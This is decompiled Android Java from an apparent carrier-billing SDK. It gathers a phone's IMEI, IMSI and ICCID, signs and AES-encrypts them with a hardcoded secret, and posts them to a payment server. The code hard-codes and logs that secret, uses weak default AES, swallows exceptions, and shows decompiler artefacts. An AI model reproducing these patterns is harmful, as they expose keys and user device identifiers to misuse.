package com.upay.billing.engine.ck_mdo;

import android.annotation.SuppressLint;
import android.content.Context;
import android.util.Log;
import com.upay.billing.MtContext;
import com.upay.billing.UpayActivity;
import com.upay.billing.UpayContext;
import com.upay.billing.UpayCore;
import com.upay.billing.bean.Cmd;
import com.upay.billing.bean.Op;
import com.upay.billing.bean.Plan;
import com.upay.billing.bean.Trade;
import com.upay.billing.engine.CommonEngine;
import com.upay.billing.utils.HttpRunner;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.Util;
import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import org.json.JSONObject;

public class Main
  extends CommonEngine
{
  private static final String TAG = "ckmdo--Main";
  public static final String app_secret = "6428520631517551";
  public static final String channelId = "001081";
  public static final String ckMdoUrl = "http://wap.cocospay.com/order/add/001081";
  public static final String subChannelId = "858002";
  private List<String> sendFail;
  private List<String> sendSucc;
  
  public Main() {}
  
  @SuppressLint({"TrulyRandom"})
  public static String decrypt(String paramString1, String paramString2)
  {
    try
    {
      paramString2 = new SecretKeySpec(paramString2.getBytes(), "AES");
      Cipher localCipher = Cipher.getInstance("AES");
      localCipher.init(2, paramString2);
      paramString1 = new String(localCipher.doFinal(parseHexStr2Byte(paramString1)), "utf-8");
      return paramString1;
    }
    catch (Exception paramString1) {}
    return null;
  }
  
  @SuppressLint({"TrulyRandom"})
  public static String encrypt(String paramString1, String paramString2)
  {
    try
    {
      paramString2 = new SecretKeySpec(paramString2.getBytes(), "AES");
      Cipher localCipher = Cipher.getInstance("AES");
      paramString1 = paramString1.getBytes("utf-8");
      localCipher.init(1, paramString2);
      paramString1 = parseByte2HexStr(localCipher.doFinal(paramString1));
      return paramString1;
    }
    catch (Exception paramString1) {}
    return null;
  }
  
  private String getSignStr(HashMap<String, String> paramHashMap)
  {
    paramHashMap = "ICCID=" + (String)paramHashMap.get("ICCID") + "&IMEI=" + (String)paramHashMap.get("IMEI") + "&IMSI=" + (String)paramHashMap.get("IMSI") + "&packageName=" + (String)paramHashMap.get("packageName") + "&price=" + (String)paramHashMap.get("price") + "&subChannelId=" + (String)paramHashMap.get("subChannelId") + "&tranNum=" + (String)paramHashMap.get("tranNum") + (String)paramHashMap.get("app_secret");
    Log.e("signStr--->", paramHashMap);
    return Util.md5(paramHashMap, false);
  }
  
  @SuppressLint({"DefaultLocale"})
  public static String parseByte2HexStr(byte[] paramArrayOfByte)
  {
    StringBuffer localStringBuffer = new StringBuffer();
    int i = 0;
    while (i < paramArrayOfByte.length)
    {
      String str2 = Integer.toHexString(paramArrayOfByte[i] & 0xFF);
      String str1 = str2;
      if (str2.length() == 1) {
        str1 = '0' + str2;
      }
      localStringBuffer.append(str1.toUpperCase());
      i += 1;
    }
    return localStringBuffer.toString();
  }
  
  @SuppressLint({"DefaultLocale"})
  public static byte[] parseHexStr2Byte(String paramString)
  {
    if (paramString.length() < 1) {
      return null;
    }
    byte[] arrayOfByte = new byte[paramString.length() / 2];
    int i = 0;
    while (i < paramString.length() / 2)
    {
      arrayOfByte[i] = ((byte)(Integer.parseInt(paramString.substring(i * 2, i * 2 + 1), 16) * 16 + Integer.parseInt(paramString.substring(i * 2 + 1, i * 2 + 2), 16)));
      i += 1;
    }
    return arrayOfByte;
  }
  
  public Op getOp()
  {
    return Op.CMCC;
  }
  
  public boolean hasCustomConfirmUi()
  {
    return false;
  }
  
  public boolean isAvailable(Op paramOp, boolean paramBoolean1, boolean paramBoolean2, boolean paramBoolean3, boolean paramBoolean4)
  {
    return (paramOp == Op.CMCC) && (paramBoolean1) && (paramBoolean2);
  }
  
  @SuppressLint({"DefaultLocale"})
  public int onMtAction(MtContext paramMtContext, Json paramJson, String paramString1, String paramString2, String[] paramArrayOfString)
  {
    Log.i("ckmdo--Main", "onMtAction: exec=" + paramJson.asObject() + ",mtNum=" + paramString1 + ",mtMsg=" + paramString2);
    switch (Main.3.$SwitchMap$com$upay$billing$engine$ck_mdo$Main$ExecType[Main.ExecType.valueOf(paramJson.getStr("type").toUpperCase()).ordinal()])
    {
    default: 
      return 0;
    case 1: 
      return 524288;
    case 2: 
      return 65736;
    }
    return 0x10000 | paramJson.getInt("code");
  }
  
  public void pay(Trade paramTrade, List<Cmd> paramList)
  {
    this.sendSucc = new ArrayList();
    this.sendFail = new ArrayList();
    Cmd localCmd = (Cmd)paramList.get(0);
    String str1 = paramTrade.getSubTrade(localCmd.key).getStr("sn");
    Json localJson = Json.createObject(new Object[] { "trade_id", paramTrade.id, "goods_key", paramTrade.goodsKey, "cmd_key", localCmd.key, "bt_key", this.key, "sn", str1, "response", "" });
    Object localObject1 = new HashMap();
    ((HashMap)localObject1).put("subChannelId", "858002");
    ((HashMap)localObject1).put("tranNum", paramTrade.id);
    ((HashMap)localObject1).put("IMEI", this.core.getUpayContext().imei);
    ((HashMap)localObject1).put("IMSI", this.core.getUpayContext().imsi);
    ((HashMap)localObject1).put("ICCID", this.core.getUpayContext().iccid);
    ((HashMap)localObject1).put("packageName", this.core.getContext().getPackageName());
    ((HashMap)localObject1).put("price", String.valueOf(paramTrade.price * 100));
    ((HashMap)localObject1).put("app_secret", "6428520631517551");
    String str2 = getSignStr((HashMap)localObject1);
    ((HashMap)localObject1).remove("app_secret");
    ((HashMap)localObject1).put("sign", str2);
    localObject1 = Util.mapToJson((HashMap)localObject1);
    try
    {
      localObject1 = Util.stringToBytes(encrypt(((Json)localObject1).asObject().toString(), "6428520631517551"));
      Util.addTask(new Main.1(this, "http://wap.cocospay.com/order/add/001081", localCmd, paramTrade, str1, paramList, localJson).setDoPost().setPostData((byte[])localObject1));
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        localException.printStackTrace();
        Object localObject2 = null;
      }
    }
  }
  
  public void showProgressUi(Plan paramPlan, Trade paramTrade, String paramString1, String paramString2)
  {
    paramPlan = paramPlan.getLocalResourcePath(paramString1);
    if ((paramPlan != null) && (new File(paramPlan).exists())) {}
    for (paramPlan = Util.loadLocalText(paramPlan);; paramPlan = Util.loadAssetsText(this.core.getContext(), paramString1 + ".json"))
    {
      UpayActivity.start(this.core.getContext(), paramString1, paramPlan, 0, new Main.2(this, paramTrade, paramString2));
      return;
    }
  }
}
